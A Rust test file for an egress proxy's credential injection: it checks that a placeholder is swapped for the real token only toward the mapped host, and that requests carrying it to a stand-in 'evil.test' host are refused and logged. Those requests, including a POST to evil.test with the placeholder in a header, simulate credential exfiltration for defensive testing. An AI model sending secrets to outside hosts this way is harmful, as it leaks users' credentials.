//! Credential injection through the egress proxy (spec:
//! security-boundaries, Credential injection at the egress proxy): a child
//! that holds only a placeholder reaches the mapped host with the real
//! token, and the placeholder sent anywhere else is refused before it
//! leaves the proxy.

use std::net::IpAddr;
use std::path::Path;
use std::sync::{Arc, Mutex};

use pmt_core::secret::SecretString;
use pmt_net::DestinationPolicy;
use pmt_net::egress::inject::{Authority, CA_CERT, Injection, Mapping};
use pmt_net::egress::{Allowed, Denial, HostPolicy, Mode, Proxy, Reason, Rules};
use pmt_net::resolve::{Lookup, LookupFuture};
use rustls::pki_types::pem::PemObject as _;
use rustls::pki_types::{CertificateDer, PrivateKeyDer, PrivatePkcs8KeyDer, ServerName};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};

const TOKEN: &str = "ghp_the_real_token_0123456789";
const PLACEHOLDER: &str = "pmt-egress-00112233445566778899aabbccddeeff";

/// Every name resolves to loopback (made public by the fake-IP range).
struct Loopback;

impl Lookup for Loopback {
    fn lookup(&self, _host: &str) -> LookupFuture {
        Box::pin(async { Ok(vec![IpAddr::from([127, 0, 0, 1])]) })
    }
}

/// A TLS server for `host` (signed by a test CA written to `ca_file`)
/// that records each request head it gets and answers `200 hello`.
async fn upstream(host: &str, ca_file: &Path) -> (u16, Arc<Mutex<Vec<String>>>) {
    let mut ca_params = rcgen::CertificateParams::new(Vec::<String>::new()).unwrap();
    ca_params.is_ca = rcgen::IsCa::Ca(rcgen::BasicConstraints::Unconstrained);
    let issuer =
        rcgen::CertifiedIssuer::self_signed(ca_params, rcgen::KeyPair::generate().unwrap())
            .unwrap();
    std::fs::write(ca_file, issuer.pem()).unwrap();
    let key = rcgen::KeyPair::generate().unwrap();
    let leaf = rcgen::CertificateParams::new(vec![host.to_owned()])
        .unwrap()
        .signed_by(&key, &issuer)
        .unwrap();
    let provider = Arc::new(rustls::crypto::ring::default_provider());
    let config = rustls::ServerConfig::builder_with_provider(provider)
        .with_safe_default_protocol_versions()
        .unwrap()
        .with_no_client_auth()
        .with_single_cert(
            vec![leaf.der().clone()],
            PrivateKeyDer::Pkcs8(PrivatePkcs8KeyDer::from(key.serialize_der())),
        )
        .unwrap();
    let acceptor = tokio_rustls::TlsAcceptor::from(Arc::new(config));
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let seen = Arc::new(Mutex::new(Vec::new()));
    let heads = Arc::clone(&seen);
    pmt_core::spawn::spawn(async move {
        while let Ok((stream, _)) = listener.accept().await {
            let (acceptor, heads) = (acceptor.clone(), Arc::clone(&heads));
            pmt_core::spawn::spawn(async move {
                let Ok(mut tls) = acceptor.accept(stream).await else {
                    return;
                };
                let mut buffer = Vec::new();
                let mut chunk = [0u8; 4096];
                while !buffer.windows(4).any(|w| w == b"\r\n\r\n") {
                    match tls.read(&mut chunk).await {
                        Ok(0) | Err(_) => return,
                        Ok(n) => buffer.extend_from_slice(&chunk[..n]),
                    }
                }
                heads
                    .lock()
                    .unwrap()
                    .push(String::from_utf8_lossy(&buffer).into_owned());
                let _ = tls
                    .write_all(
                        b"HTTP/1.1 200 OK\r\nContent-Length: 5\r\nConnection: close\r\n\r\nhello",
                    )
                    .await;
                let _ = tls.shutdown().await;
            });
        }
    });
    (port, seen)
}

struct Fixture {
    _dir: tempfile::TempDir,
    proxy: Proxy,
    egress_ca: CertificateDer<'static>,
    denials: Arc<Mutex<Vec<Denial>>>,
}

fn fixture(upstream_ca: &Path, dir: tempfile::TempDir) -> Fixture {
    let authority = Authority::open(&dir.path().join("egress")).unwrap();
    let egress_ca = CertificateDer::from_pem_file(dir.path().join("egress").join(CA_CERT)).unwrap();
    let mut upstream = pmt_net::tls::client_config(Some(upstream_ca)).unwrap();
    upstream.alpn_protocols = vec![b"http/1.1".to_vec()];
    let injection = Injection {
        mappings: vec![Mapping {
            name: "GITHUB_TOKEN".to_owned(),
            placeholder: PLACEHOLDER.to_owned(),
            value: SecretString::new(TOKEN),
            hosts: vec![Allowed::parse("api.github.test")],
        }],
        authority: Arc::new(authority),
        upstream: Arc::new(upstream),
    };
    let denials = Arc::new(Mutex::new(Vec::new()));
    let sink = Arc::clone(&denials);
    let rules = Rules::new(
        Arc::new(HostPolicy::new(Mode::Public, Vec::new())),
        DestinationPolicy::new(false, &["127.0.0.1/32".to_owned()]).unwrap(),
        "terminal",
    )
    .with_lookup(Arc::new(Loopback))
    .observed(Arc::new(move |d| sink.lock().unwrap().push(d)))
    .injecting(Arc::new(injection));
    Fixture {
        _dir: dir,
        proxy: Proxy::start(rules).unwrap(),
        egress_ca,
        denials,
    }
}

/// What a child does: `CONNECT host:port` through the proxy, TLS trusting
/// only the egress CA, one request carrying the placeholder; the answer.
async fn child_request(fx: &Fixture, host: &str, port: u16) -> String {
    let mut stream = TcpStream::connect(fx.proxy.addr()).await.unwrap();
    stream
        .write_all(format!("CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}\r\n\r\n").as_bytes())
        .await
        .unwrap();
    let mut established = [0u8; 39];
    stream.read_exact(&mut established).await.unwrap();
    assert!(established.starts_with(b"HTTP/1.1 200"));
    let mut roots = rustls::RootCertStore::empty();
    roots.add(fx.egress_ca.clone()).unwrap();
    let provider = Arc::new(rustls::crypto::ring::default_provider());
    let config = rustls::ClientConfig::builder_with_provider(provider)
        .with_safe_default_protocol_versions()
        .unwrap()
        .with_root_certificates(roots)
        .with_no_client_auth();
    let connector = tokio_rustls::TlsConnector::from(Arc::new(config));
    let name = ServerName::try_from(host.to_owned()).unwrap();
    let mut tls = connector.connect(name, stream).await.unwrap();
    let request = format!(
        "GET /user HTTP/1.1\r\nHost: {host}\r\nAuthorization: Bearer {PLACEHOLDER}\r\n\r\n"
    );
    tls.write_all(request.as_bytes()).await.unwrap();
    let mut answer = Vec::new();
    let _ = tls.read_to_end(&mut answer).await;
    String::from_utf8_lossy(&answer).into_owned()
}

/// Scenario: Placeholder sent elsewhere. The mapped host receives the real
/// token; `evil.test` gets nothing, the child a 403, and the refusal is
/// reported as `credential_misdirected`.
#[tokio::test]
async fn the_placeholder_becomes_the_token_only_for_the_mapped_host() {
    let dir = tempfile::tempdir_in(env!("CARGO_TARGET_TMPDIR")).unwrap();
    let ca_file = dir.path().join("upstream-ca.pem");
    let (github, github_heads) = upstream("api.github.test", &ca_file).await;
    let evil_ca = dir.path().join("evil-ca.pem");
    let (evil, evil_heads) = upstream("evil.test", &evil_ca).await;
    let fx = fixture(&ca_file, dir);

    let answer = child_request(&fx, "api.github.test", github).await;
    assert!(answer.ends_with("hello"), "{answer}");
    let heads = github_heads.lock().unwrap().clone();
    assert_eq!(heads.len(), 1);
    assert!(
        heads[0].contains(&format!("Bearer {TOKEN}")),
        "{}",
        heads[0]
    );
    assert!(!heads[0].contains(PLACEHOLDER));
    assert!(heads[0].contains("Connection: close"));

    let refused = child_request(&fx, "evil.test", evil).await;
    assert!(refused.starts_with("HTTP/1.1 403"), "{refused}");
    assert!(refused.contains("credential misdirected"), "{refused}");
    assert!(!refused.contains(TOKEN));
    assert!(evil_heads.lock().unwrap().is_empty());
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;
    let denials = fx.denials.lock().unwrap().clone();
    assert_eq!(denials.len(), 1, "{denials:?}");
    assert_eq!(denials[0].host, "evil.test");
    assert_eq!(denials[0].reason, Reason::CredentialMisdirected);
    assert_eq!(
        Reason::CredentialMisdirected.as_str(),
        "credential_misdirected"
    );
}

/// A plain-HTTP request never carries the real value, and the placeholder
/// to an unmapped plain-HTTP host is refused too.
#[tokio::test]
async fn plain_http_gets_no_value_and_a_foreign_placeholder_is_refused() {
    let dir = tempfile::tempdir_in(env!("CARGO_TARGET_TMPDIR")).unwrap();
    let ca_file = dir.path().join("upstream-ca.pem");
    let _ = upstream("unused.test", &ca_file).await;
    let fx = fixture(&ca_file, dir);
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let mut stream = TcpStream::connect(fx.proxy.addr()).await.unwrap();
    stream
        .write_all(
            format!(
                "POST http://evil.test:{port}/c HTTP/1.1\r\nHost: evil.test\r\nX-Key: {PLACEHOLDER}\r\n\r\n"
            )
            .as_bytes(),
        )
        .await
        .unwrap();
    let mut answer = Vec::new();
    let _ = stream.read_to_end(&mut answer).await;
    let answer = String::from_utf8_lossy(&answer);
    assert!(answer.starts_with("HTTP/1.1 403"), "{answer}");
    listener.set_nonblocking(true).unwrap();
    assert!(listener.accept().is_err(), "nothing reached evil.test");
}
